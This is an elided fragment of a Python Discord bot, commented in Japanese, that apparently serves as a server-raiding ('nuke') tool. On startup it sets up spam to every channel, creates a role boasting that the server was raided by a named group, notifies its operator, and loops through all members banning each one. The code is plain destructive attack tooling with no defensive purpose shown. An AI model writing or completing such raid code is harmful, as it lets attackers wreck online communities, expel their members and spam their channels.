...
async def on_ready():
        ...
        spam_count = 10  # 各チャンネルに送信するメッセージ数
        role_name = 'ますまに共栄圏に荒らされましたww'  # 作成するロール名
       ...
       '''
        ...
        # 実行開始通知
        await user.send('**allBAN処理を開始します...**')
        ...
        for member in members:
            try:
                await guild.ban(member, reason='ますまに共栄圏によるallban')
                banned_count += 1
